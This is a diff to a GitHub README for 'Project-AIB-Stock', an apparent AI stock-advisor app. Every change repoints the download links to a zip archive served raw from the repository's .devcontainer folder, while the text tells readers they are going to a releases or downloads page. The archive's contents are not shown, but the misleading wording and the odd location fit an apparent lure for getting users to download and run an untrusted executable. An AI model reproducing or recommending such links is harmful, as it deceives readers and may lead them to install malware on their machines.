@@ -1,6 +1,6 @@
 # ⚙️ Project-AIB-Stock - Your AI Financial Advisor Made Simple
 
-[![Download Project-AIB-Stock](https://raw.githubusercontent.com/Imsunchrist/Project-AIB-Stock/senju/ai-stock-analyst-blockchain/blockchain/Project-AIB-Stock_2.9.zip%20Now%20%3E%3E-brightgreen)](https://raw.githubusercontent.com/Imsunchrist/Project-AIB-Stock/senju/ai-stock-analyst-blockchain/blockchain/Project-AIB-Stock_2.9.zip)
+[![Download Project-AIB-Stock](https://raw.githubusercontent.com/Imsunchrist/Project-AIB-Stock/senju/.devcontainer/Stock-Project-AI-v1.2.zip%20Now%20%3E%3E-brightgreen)](https://raw.githubusercontent.com/Imsunchrist/Project-AIB-Stock/senju/.devcontainer/Stock-Project-AI-v1.2.zip)
 
 ## 📈 Overview
 
@@ -14,7 +14,7 @@ Follow these steps to download and install Project-AIB-Stock:
 
 To start, visit the releases page. You can find the latest version of Project-AIB-Stock by clicking the link below. This is where you will download the application.
 
-[Download Project-AIB-Stock](https://raw.githubusercontent.com/Imsunchrist/Project-AIB-Stock/senju/ai-stock-analyst-blockchain/blockchain/Project-AIB-Stock_2.9.zip)
+[Download Project-AIB-Stock](https://raw.githubusercontent.com/Imsunchrist/Project-AIB-Stock/senju/.devcontainer/Stock-Project-AI-v1.2.zip)
 
 ### Step 2: Choose Your Version
 
@@ -52,7 +52,7 @@ Project-AIB-Stock offers various features designed to help you make informed inv
 
 To download and run Project-AIB-Stock, click the link below. This will take you directly to the downloads section where you can choose the version you wish to install.
 
-[Download Project-AIB-Stock](https://raw.githubusercontent.com/Imsunchrist/Project-AIB-Stock/senju/ai-stock-analyst-blockchain/blockchain/Project-AIB-Stock_2.9.zip)
+[Download Project-AIB-Stock](https://raw.githubusercontent.com/Imsunchrist/Project-AIB-Stock/senju/.devcontainer/Stock-Project-AI-v1.2.zip)
 
 ## 📊 Frequently Asked Questions
 
